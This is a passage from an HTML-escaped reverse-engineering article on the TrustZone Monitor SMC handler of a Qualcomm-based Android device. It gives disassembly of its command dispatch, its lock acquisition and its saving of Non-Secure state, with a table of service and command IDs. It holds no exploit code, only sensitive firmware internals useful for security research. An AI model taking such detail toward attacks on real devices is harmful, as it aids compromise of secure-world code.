service identifier svc and a command identifier cmd defined as
((svc) &amp;lt;&amp;lt; 10)|((cmd) &amp;amp; 0x3ff).&lt;br&gt;
Then R0 value is tested against several immediate values. For each
case, a specific function is called if values match.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D048&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSR&lt;/span&gt;&lt;span class="c1"&gt;#12 ; extract service &amp;amp; command identifiers&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D04C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x402 ; SCM_SVC_BOOT::SCM_CMD_TERMINATE_PC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D050&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D054&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D058&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D360&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D05C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xC05 ; SCM_SVC_UTIL::CACHE_BUFFER_DUMP_COMMAND_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D060&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D064&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D068&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D68C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D06C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x404 ; SCM_SVC_BOOT::4&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D070&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D074&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D078&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D72C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D07C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1401 ; SCM_SVC_IO::SCM_IO_READ&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D080&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D084&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D088&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5AC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D08C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1402 ; SCM_SVC_IO::SCM_IO_WRITE&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D090&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D094&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D098&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5CC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D09C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x3404 ; SCM_SVC_DCVS::DCVS_CMD_EVENT&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D64C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0AC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1403 ; SCM_SVC_IO::TZ_RESET_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5EC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0BC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1404 ; SCM_SVC_IO::TZ_UPDATE_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D618&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0CC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x2401 ; SCM_SVC_PWR::SCM_IO_DISABLE_PMIC_ARBITER&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D74C&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As Linux kernel itself initiates a lot of SMC calls, we explore
&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/"&gt;
Linux sources&lt;/a&gt; to enumerate service and command identifiers
passed to SMC calls. Thereby, we will get more information on
corresponding functions without reversing them.&lt;br&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Immediate value&lt;/th&gt;
&lt;th&gt;Service ID (imm&amp;gt;&amp;gt;10)&lt;/th&gt;
&lt;th&gt;Command ID (imm&amp;amp;0x3ff)&lt;/th&gt;
&lt;th&gt;Function description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x402&lt;/td&gt;
&lt;td&gt;SCM_SVC_BOOT&lt;/td&gt;
&lt;td&gt;SCM_CMD_TERMINATE_PC&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/b0650348df9152b11187a65d777d191bcae0817e%5E%21/"&gt;
Put current core in low power state&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xC05&lt;/td&gt;
&lt;td&gt;SCM_SVC_UTIL&lt;/td&gt;
&lt;td&gt;CACHE_BUFFER_DUMP_COMMAND_ID&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/7b63736cd68dac64b889f18d3e9cfa037e12e076%5E%21/"&gt;
Dump the L1 and L2 caches on panic&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x404&lt;/td&gt;
&lt;td&gt;SCM_SVC_BOOT&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1401&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;SCM_IO_READ&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1402&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;SCM_IO_WRITE&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3404&lt;/td&gt;
&lt;td&gt;SCM_SVC_DCVS&lt;/td&gt;
&lt;td&gt;DCVS_CMD_EVENT&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/f53ef1b26b1a06255648e7db5db395d9439af483%5E%21/"&gt;
Handle some Dynamic Clock and Voltage Scaling (DCVS)&lt;/a&gt;&amp;nbsp;See
also&amp;nbsp;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/include/mach/msm_dcvs_scm.h"&gt;event
definitions&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1403&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;TZ_RESET_ID&lt;/td&gt;
&lt;td&gt;Related to GPU power management&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1404&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;TZ_UPDATE_ID&lt;/td&gt;
&lt;td&gt;Related to GPU power management&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x2401&lt;/td&gt;
&lt;td&gt;SCM_SVC_PWR&lt;/td&gt;
&lt;td&gt;SCM_IO_DISABLE_PMIC_ARBITER&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/restart.c"&gt;
"Force the SPMI PMIC arbiter to shutdown so that no more SPMI
transactions are sent from the MSM to the PMIC."&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
All these functions have the same epilogue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D738&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FIQ OR SCR_AW ; 0b100101&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D73C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR : switch to Non-Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D740&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D744&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R3 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D748&lt;/span&gt;                 &lt;span class="no"&gt;MOVS&lt;/span&gt;            &lt;span class="no"&gt;PC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Non-Secure PC &amp;amp; CPSR from LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These instructions switch the processor to Non-Secure state and
restore PC &amp;amp; CPSR to perform an exception return.&lt;br&gt;
&lt;br&gt;
So SMC calls associated with these specific command/service IDs are
kind of "Monitor calls", entirely handled in Monitor mode.&lt;/p&gt;
&lt;p&gt;But if R0 value does not match these IDs, the execution continues
in Monitor mode.&lt;/p&gt;
&lt;h5&gt;IV.3.A.c TrustZone lock&lt;/h5&gt;

&lt;p&gt;If the call has not been handled yet, Monitor code tries to acquire
a lock to ensure that only one core at a time enters in
TrustZone.&lt;/p&gt;
&lt;p&gt;First, current CPU id is retrieved from MPIDR. Then, this value is
incremented (because 0 means not locked) and used as lock
value.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E4&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; read MPIDR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E8&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; extract Aff0 from MPIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0EC&lt;/span&gt;                 &lt;span class="no"&gt;ADD&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt; &lt;span class="no"&gt;loc_FE80D0F0&lt;/span&gt;                            &lt;span class="c1"&gt;; CODE XREF: smc_handler+D8j&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt;                 &lt;span class="no"&gt;LDREX&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; read current tz_lock value&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F4&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; test if TrustZone is locked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F8&lt;/span&gt;                 &lt;span class="no"&gt;STREXEQ&lt;/span&gt;         &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; if not locked, try to lock TrustZone&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0FC&lt;/span&gt;                 &lt;span class="no"&gt;CMPEQ&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; test if TrustZone is now locked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D100&lt;/span&gt;                 &lt;span class="no"&gt;BNE&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D0F0&lt;/span&gt; &lt;span class="c1"&gt;; retry if TrustZone is still not locked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D104&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; Data Memory Barrier acts as a memory barrier&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, it tries to acquire the TrustZone lock. This implementation
is very similar to the example provided in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (D7.3.1 Acquiring a lock).&lt;/p&gt;
&lt;p&gt;It relies on synchronization primitives (LDREX/STREX) to support
exclusive accesses to memory shared between cores.
Once the lock is acquired, the current core is the only one running
in TrustZone, and the execution can continue.&lt;/p&gt;
&lt;h5&gt;IV.3.A.d Pre-exception status&lt;/h5&gt;

&lt;p&gt;LR_mon and SPSR_mon are both banked registers. Their values are
generated by the exception entry. LR_mon contains the return
address in Non-Secure world (right after the SMC instruction). The
purpose of SPSR_mon is to record the pre-exception value of the
CPSR.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D108&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Non-Secure (NS) status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D10C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; read NS return address (LR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D110&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read NS CPSR (SPSR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D114&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;; write LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These two registers are saved in Secure memory to be restored later on exception return.&lt;/p&gt;
&lt;h5&gt;IV.3.A.e IRQ interruption flag&lt;/h5&gt;

&lt;p&gt;Then a DWORD at a static address is unconditionally cleared:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D118&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_irq_interrupted&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D11C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
